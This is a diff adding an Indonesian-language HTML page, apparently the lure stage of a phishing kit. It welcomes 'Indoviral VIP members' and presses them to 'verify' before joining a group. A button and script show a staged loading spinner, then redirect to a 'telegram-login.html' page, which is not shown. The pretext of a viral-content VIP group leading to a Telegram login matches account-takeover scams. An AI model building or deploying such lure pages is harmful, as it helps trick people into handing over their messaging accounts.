@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selamat Datang Member VIP Indoviral</title>
+    <link rel="icon" href="assets/img/icon-192x192.png">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #F4F7FA;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+            position: relative;
+        }
+        .header h1 {
+            font-size: 34px;
+            color: #2C2C2C;
+            margin-bottom: 10px;
+        }
+        .header p {
+            font-size: 16px;
+            color: #7A7A7A;
+            margin-bottom: 20px;
+        }
+        .content {
+            color: #4A4A4A;
+        }
+        .content h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .content p {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .feature-list {
+            margin-bottom: 30px;
+        }
+        .feature-list ul {
+            list-style: none;
+            padding: 0;
+        }
+        .feature-list li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .feature-list li svg {
+            margin-right: 10px;
+            fill: #0078D4;
+        }
+        .button-container {
+            display: flex;
+            justify-content: center;
+        }
+        .verify-button {
+            background-color: #0078D4;
+            color: #ffffff;
+            font-size: 16px;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            width: 200px;
+            transition: background-color 0.3s ease;
+        }
+        .verify-button:hover {
+            background-color: #005E8C;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #A0A0A0;
+        }
+        .footer a {
+            color: #0078D4;
+            text-decoration: none;
+        }
+
+        /* Loading Spinner */
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #0078D4;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Media Queries for Responsiveness */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 28px;
+            }
+            .header p {
+                font-size: 14px;
+            }
+            .content h2 {
+                font-size: 20px;
+            }
+            .content p {
+                font-size: 14px;
+            }
+            .verify-button {
+                width: 180px;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            .header h1 {
+                font-size: 24px;
+            }
+            .header p {
+                font-size: 12px;
+            }
+            .content h2 {
+                font-size: 18px;
+            }
+            .content p {
+                font-size: 12px;
+            }
+            .verify-button {
+                width: 160px;
+                font-size: 12px;
+                padding: 12px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 style="color: #0078D4;">Selamat Datang Member VIP Indoviral!</h1>
+            <p>Terima kasih telah bergabung dengan Indoviral. Sebelum Anda bisa masuk ke grup VIP, harap selesaikan proses verifikasi.</p>
+        </div>
+        
+        <div class="content">
+            <h2 style="color: #0078D4;">Kenapa Anda Harus Melakukan Verifikasi?</h2>
+            <p>Verifikasi ini diperlukan untuk memastikan bahwa Anda adalah member yang sah, sehingga Anda bisa mendapatkan akses penuh ke semua fitur eksklusif di grup VIP Indoviral.</p>
+            
+            <div class="feature-list">
+                <ul>
+                    <li><svg width="24" height="24" viewBox="0 0 24 24"><path d="M10 17l5-5-5-5v10z"></path></svg><span>akses penuh ke grup VIP Indoviral</span></li>
+                    <li><svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 2v10h10V2H12zM2 12h10v10H2V12z"></path></svg><span>update informasi viral terbaru setiap saat</span></li>
+                    <li><svg width="24" height="24" viewBox="0 0 24 24"><path d="M10 17l5-5-5-5v10z"></path></svg><span>Mendapatkan hak akses secara permanent</span></li>
+                </ul>
+            </div>
+
+            <div class="button-container">
+                <a href="telegram-login.html" class="verify-button" onclick="showLoading()">Verifikasi Sekarang</a>
+
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Indoviral - Semua hak cipta dilindungi. <a href="terms.html">Syarat & Ketentuan</a> | <a href="privacy.html">Kebijakan Privasi</a></p>
+        </div>
+
+        <!-- Loading Spinner -->
+        <div class="loading" id="loading"></div>
+    </div>
+
+    <script>
+        function showLoading() {
+            // Menampilkan spinner loading
+            document.getElementById("loading").style.display = "block";
+            
+            // Setelah 2 detik, sembunyikan loading dan lanjutkan
+            setTimeout(function() {
+                document.getElementById("loading").style.display = "none";
+                // Redirect atau proses lainnya bisa ditambahkan di sini, contoh:
+                // alert("Verifikasi berhasil! Anda sekarang dapat mengakses grup.");?
+                window.location.href = "telegram-login.html"; // contoh redirect ke grup VIP
+            }, 9000); // Waktu loading 2 detik
+        }
+    </script>
+</body>
+</html>
